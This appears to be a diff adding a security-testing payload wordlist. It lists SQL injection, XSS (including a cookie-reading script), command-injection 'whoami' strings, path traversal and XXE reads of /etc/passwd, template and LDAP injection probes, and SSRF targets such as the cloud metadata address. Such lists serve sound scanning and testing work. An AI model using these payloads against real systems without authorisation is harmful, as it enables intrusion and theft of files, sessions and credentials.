@@ -1,0 +1,25 @@
+' OR '1'='1
+' OR 1=1--
+" OR ""="
+'; WAITFOR DELAY '0:0:5'--
+admin'--
+<script>alert(1)</script>
+"><script>alert(document.cookie)</script>
+javascript:alert(1)
+<img src=x onerror=alert(1)>
+; whoami
+| whoami
+`whoami`
+$(whoami)
+../../../etc/passwd
+..\..\..\windows\win.ini
+/etc/passwd
+{{7*7}}
+${7*7}
+*)(&)
+*)(uid=*))(|(uid=*
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
+https://evil.com
+//evil.com
+http://169.254.169.254
+http://localhost:8080
